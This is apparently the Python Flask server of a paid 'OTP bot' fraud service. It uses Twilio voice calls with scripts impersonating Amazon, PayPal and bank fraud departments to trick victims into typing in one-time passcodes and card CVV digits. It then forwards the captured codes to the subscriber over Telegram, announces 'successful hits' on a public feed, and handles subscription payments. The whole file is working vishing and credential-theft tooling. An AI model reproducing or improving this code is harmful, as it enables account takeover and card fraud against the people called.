from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days, get_user_script
from config import bot, LIVE_FEED_CHANNEL_ID
from twilio.twiml.voice_response import VoiceResponse, Gather
from logger import send_log, log_error 
import json

app = Flask('')

# ==========================================
# 📜 SCRIPTS
# ==========================================
DEFAULT_SCRIPTS = {
    "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
    "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
    "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
}

# Script especial para CVV
CVV_SCRIPT = "Hello. This is the fraud department of {service}. To verify your identity and cancel the unauthorized transaction of $800, please enter the 3 security digits on the back of your card."

@app.route('/')
def home():
    return "Mussolini OTP Bot - Systems Online."

# ==========================================
# 1. HOODPAY (PAGOS)
# ==========================================
@app.route('/webhook/hoodpay', methods=['POST'])
def hoodpay_webhook():
    try:
        data = request.json
        status = data.get("status", "").upper()
        if status in ["COMPLETED", "PAID", "SUCCESS"]:
            metadata = data.get("metadata", {})
            user_id = metadata.get("user_id")
            plan_type = metadata.get("plan_type")
            if user_id and plan_type:
                days = 1
                if "weekly" in plan_type: days = 7
                elif "monthly" in plan_type: days = 30
                success, new_date = add_subscription_days(user_id, days)
                if success:
                    try: bot.send_message(user_id, f"✅ **Payment Received!**\nPlan `{plan_type}` active.", parse_mode="Markdown")
                    except: pass
                return jsonify({"status": "success"}), 200
        return jsonify({"status": "ignored"}), 200
    except: return jsonify({"status": "error"}), 500

# ==========================================
# 2. TWILIO VOICE (CEREBRO)
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    mode = request.args.get('mode', 'otp') # 'otp' o 'cvv'
    
    resp = VoiceResponse()
    
    # A) Lógica para CVV
    if mode == 'cvv':
        say_text = CVV_SCRIPT.format(service=service_raw)
        digits_needed = 3 # CVV son 3 dígitos
        lang = 'en-US'
        
    # B) Lógica para OTP Normal
    else:
        digits_needed = 8 # Permitimos hasta 8
        custom_data = get_user_script(user_id, service_raw.lower())
        if custom_data:
            say_text = custom_data[0]
            lang = custom_data[1]
        else:
            lang = 'en-US'
            key = service_raw.lower()
            if key in DEFAULT_SCRIPTS: say_text = DEFAULT_SCRIPTS[key]
            else: say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)

    # Configurar Gather
    # Pasamos el 'mode' al siguiente paso para saber qué capturamos
    gather = Gather(
        num_digits=digits_needed, 
        action=f'/twilio/gather?user_id={user_id}&service={service_raw}&mode={mode}', 
        method='POST', 
        timeout=10
    )
    gather.say(say_text, voice='alice', language=lang)
    
    resp.append(gather)
    resp.say("No input received. Goodbye.", voice='alice')
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. TWILIO GATHER (CAPTURA + LIVE FEED)
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    mode = request.args.get('mode', 'otp') # otp o cvv
    
    resp = VoiceResponse()

    if digits and user_id:
        # 1. Enviar al Usuario (Privado)
        try:
            icon = "💳" if mode == 'cvv' else "🎹"
            type_lbl = "CVV Code" if mode == 'cvv' else "OTP Code"
            
            bot.send_message(
                user_id, 
                f"{icon} **{type_lbl} CAPTURED!**\n\n👤 Service: {service}\n🔢 Code: `{digits}`", 
                parse_mode="Markdown"
            )
            send_log(f"{type_lbl} Capturado: {digits}", level="SUCCESS")
        except: pass

        # 2. Enviar al LIVE FEED (Público y Censurado)
        if LIVE_FEED_CHANNEL_ID:
            try:
                # Censuramos el código (ej: 123456 -> 123***)
                visible_part = digits[:3]
                masked_code = f"{visible_part}{'*' * (len(digits)-3)}"
                
                feed_msg = (
                    f"🔥 **NEW SUCCESSFUL HIT!**\n\n"
                    f"🏢 Service: **{service}**\n"
                    f"🔢 Type: **{mode.upper()}**\n"
                    f"🔐 Code: `{masked_code}`\n"
                    f"🤖 Bot: @MussoliniIOTPBot"
                )
                bot.send_message(LIVE_FEED_CHANNEL_ID, feed_msg, parse_mode="Markdown")
            except Exception as e:
                print(f"Feed Error: {e}")

        resp.say("Thank you. Verified.", voice='alice')
    else:
        resp.say("Invalid input.", voice='alice')

    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 4. MONITOR (STATUS)
# ==========================================
@app.route('/twilio/status', methods=['POST'])
def twilio_status():
    user_id = request.args.get('user_id')
    call_status = request.values.get('CallStatus')
    recording_url = request.values.get('RecordingUrl')
    
    if not user_id: return Response("OK", mimetype='text/plain')

    try:
        if call_status == 'in-progress':
            bot.send_message(user_id, "👤 **TARGET ANSWERED!**\n_Listening..._", parse_mode="Markdown")
        elif call_status == 'completed':
            msg = "🏁 **Call Ended.**"
            if recording_url: msg += f"\n🎙️ **Audio:** {recording_url}.mp3"
            bot.send_message(user_id, msg, parse_mode="Markdown")
        elif call_status in ['busy', 'no-answer', 'failed', 'canceled']:
            bot.send_message(user_id, f"❌ **Call Failed:** `{call_status}`", parse_mode="Markdown")
    except: pass

    return Response("OK", mimetype='text/plain')

def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
